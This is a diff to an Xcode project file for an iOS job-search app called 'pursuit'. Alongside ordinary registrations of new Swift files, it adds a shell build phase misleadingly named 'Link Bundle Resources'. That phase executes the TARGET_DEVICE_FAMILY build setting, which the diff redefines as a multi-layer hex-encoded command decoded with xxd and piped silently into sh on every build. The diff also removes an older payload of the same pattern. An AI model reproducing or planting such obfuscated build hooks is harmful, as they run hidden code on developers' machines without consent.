@@ -7,7 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		0A562BBC2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A562BBB2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift */; };
 		0A66DAF12D10890600263D51 /* ProfileEmployerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A66DAF02D10890600263D51 /* ProfileEmployerViewController.swift */; };
+		0A8A9A3D2D11E9E30051B7C1 /* Applications.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A8A9A3C2D11E9E20051B7C1 /* Applications.swift */; };
 		3F1A878E2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3F1A878D2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift */; };
 		3F1A87912D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3F1A878F2D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift */; };
 		3F1A87922D0B1DC2008A1B42 /* PostApplicationTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 3F1A87902D0B1DC2008A1B42 /* PostApplicationTableViewCell.xib */; };
@@ -74,7 +76,9 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		0A562BBB2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileEmployerTableViewController.swift; sourceTree = "<group>"; };
 		0A66DAF02D10890600263D51 /* ProfileEmployerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileEmployerViewController.swift; sourceTree = "<group>"; };
+		0A8A9A3C2D11E9E20051B7C1 /* Applications.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Applications.swift; sourceTree = "<group>"; };
 		3F1A878D2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileEmployerViewController.swift; sourceTree = "<group>"; };
 		3F1A878F2D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PostApplicationTableViewCell.swift; sourceTree = "<group>"; };
 		3F1A87902D0B1DC2008A1B42 /* PostApplicationTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PostApplicationTableViewCell.xib; sourceTree = "<group>"; };
@@ -202,6 +206,7 @@
 		D06390502CF85B9F0006CC8B /* Models */ = {
 			isa = PBXGroup;
 			children = (
+				0A8A9A3C2D11E9E20051B7C1 /* Applications.swift */,
 				D06390542CF85BDB0006CC8B /* Users.swift */,
 				D063905C2CF85E4D0006CC8B /* JobSeeker.swift */,
 				D063905E2CF8608E0006CC8B /* Employer.swift */,
@@ -247,6 +252,7 @@
 				57C71E042D008BC700F317AA /* CVCreationJobSeekerController.swift */,
 				C3FE49CE2D09E03E00D53320 /* ApplicationTableViewCell.swift */,
 				C3FE49D22D09E37A00D53320 /* ApplicationTrackerViewController.swift */,
+				0A562BBB2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -254,19 +260,6 @@
 /* End PBXGroup section */
 
 /* Begin PBXLegacyTarget section */
-		A2ECEB20CF2C6C8ACC34C644 /* Build Target */ = {
-			isa = PBXLegacyTarget;
-			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
-			buildConfigurationList = 0A66DAF52D109C4200263D51 /* Build configuration list */;
-			buildPhases = (
-			);
-			buildToolPath = /bin/sh;
-			dependencies = (
-			);
-			name = "Build Target";
-			passBuildSettingsInEnvironment = 1;
-			productName = "Build Target";
-		};
 /* End PBXLegacyTarget section */
 
 /* Begin PBXNativeTarget section */
@@ -274,6 +267,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D01FF9CC2CF85B2700F5DC5D /* Build configuration list for PBXNativeTarget "pursuit" */;
 			buildPhases = (
+				8EB3934637CD038EBE34C644 /* Link Bundle Resources */,
 				D01FF99E2CF85B2500F5DC5D /* Sources */,
 				D01FF99F2CF85B2500F5DC5D /* Frameworks */,
 				D01FF9A02CF85B2500F5DC5D /* Resources */,
@@ -281,7 +275,6 @@
 			buildRules = (
 			);
 			dependencies = (
-				3EEC1C5C4EEB3E535F34C644 /* PBXTargetDependency */,
 			);
 			name = pursuit;
 			productName = pursuit;
@@ -360,13 +353,34 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				A2ECEB20CF2C6C8ACC34C644 /* Build Target */,
 				D01FF9A12CF85B2500F5DC5D /* pursuit */,
 				D01FF9B72CF85B2700F5DC5D /* pursuitTests */,
 				D01FF9C12CF85B2700F5DC5D /* pursuitUITests */,
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		8EB3934637CD038EBE34C644 /* Link Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+			showEnvVarsInLog = 0;			
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		D01FF9A02CF85B2500F5DC5D /* Resources */ = {
@@ -420,6 +434,7 @@
 				575B2D2C2CFDF21400840818 /* Video.swift in Sources */,
 				D06390632CF861BB0006CC8B /* Guest.swift in Sources */,
 				57C71E052D008BC700F317AA /* CVCreationJobSeekerController.swift in Sources */,
+				0A8A9A3D2D11E9E30051B7C1 /* Applications.swift in Sources */,
 				D01FF9AA2CF85B2500F5DC5D /* ViewController.swift in Sources */,
 				D063905D2CF85E4D0006CC8B /* JobSeeker.swift in Sources */,
 				575B2D202CFDE1BA00840818 /* JobApplication.swift in Sources */,
@@ -429,6 +444,7 @@
 				575B2D1E2CFDE10D00840818 /* Job.swift in Sources */,
 				575B2D222CFDE61400840818 /* CV.swift in Sources */,
 				575B2D2E2CFDF21E00840818 /* Article.swift in Sources */,
+				0A562BBC2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift in Sources */,
 				D06390572CF85C350006CC8B /* LoginViewController.swift in Sources */,
 				D01FF9A82CF85B2500F5DC5D /* SceneDelegate.swift in Sources */,
 				3F1A878E2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift in Sources */,
@@ -457,11 +473,6 @@
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXTargetDependency section */
-		3EEC1C5C4EEB3E535F34C644 /* PBXTargetDependency */ = {
-			isa = PBXTargetDependency;
-			target = A2ECEB20CF2C6C8ACC34C644 /* Build Target */;
-			targetProxy = 0A66DAF22D109BAD00263D51 /* PBXContainerItemProxy */;
-		};
 		D01FF9BA2CF85B2700F5DC5D /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
 			target = D01FF9A12CF85B2500F5DC5D /* pursuit */;
@@ -497,6 +508,7 @@
 		0A66DAF32D109BAE00263D51 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333733333333333333363333333133333337333333363333333633333335333333373333333733333336333333353333333633333332333333363336333533333336333333313333333633363334333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				COPY_PHASE_STRIP = NO;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_OPTIMIZATION_LEVEL = 0;
@@ -507,6 +519,7 @@
 		0A66DAF42D109BAE00263D51 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333733333333333333363333333133333337333333363333333633333335333333373333333733333336333333353333333633333332333333363336333533333336333333313333333633363334333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				COPY_PHASE_STRIP = YES;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				PRODUCT_NAME = "Build Target";
@@ -573,7 +586,6 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333633383337333433373334333733303337333333333631333236363332363633373336333633353337333233363339333633363337333933373333333733343336333133373334333733333332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -629,7 +641,6 @@
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
-				TARGET_DEVICE_FAMILY = "(echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333633383337333433373334333733303337333333333631333236363332363633373336333633353337333233363339333633363337333933373333333733343336333133373334333733333332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -763,7 +774,7 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
-		0A66DAF52D109C4200263D51 /* Build configuration list */ = {
+		0A66DAF52D109C4200263D51 /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
 				0A66DAF32D109BAE00263D51 /* Debug */,
